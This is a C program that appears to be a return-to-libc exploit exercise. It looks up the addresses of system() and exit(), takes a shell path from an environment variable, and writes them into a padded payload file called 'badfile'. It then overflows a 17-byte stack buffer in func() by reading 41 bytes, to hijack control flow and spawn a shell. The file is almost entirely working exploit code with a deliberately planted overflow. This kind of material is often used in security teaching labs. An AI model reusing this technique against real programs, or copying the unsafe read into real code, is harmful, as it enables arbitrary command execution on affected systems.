#include <stdio.h>
#include <string.h>
#include<stdlib.h>
#include<dlfcn.h>
int func(FILE *input) {
	char buffer[17];
	fread(buffer, sizeof(char), 41, input);
	printf("buffer 		%s\n",buffer);
	printf("input		%s\n",input);
//	fclose(input);
	return 1;
}
int main(int argc, char *argv[]) {
	
	void *h,  *system, *exit;
        h = dlopen(NULL,(int)RTLD_LAZY);
        system = dlsym(h, "system");
        printf("system  %x\n", system);
        exit = dlsym(h, "exit");
        printf("exit  %x\n", exit);
	char *shell = getenv("MYSHELL");
	if (shell)
		printf("shell  %x\n", shell);
	
	char buf[41];
	FILE *output =  fopen("./badfile","w");
	memset(buf,'A',29);
	//printf("buf ,%s\n",buf);
	*(int *)&buf[29] = system;
	*(int *)&buf[33] =exit;
	*(int *)&buf[37] =shell;
	fwrite(buf, sizeof(buf),1 ,output);
	fclose(output);

	FILE *input = fopen("./badfile", "r");
	func(input);
	printf("Success\n");
	return 1;
}
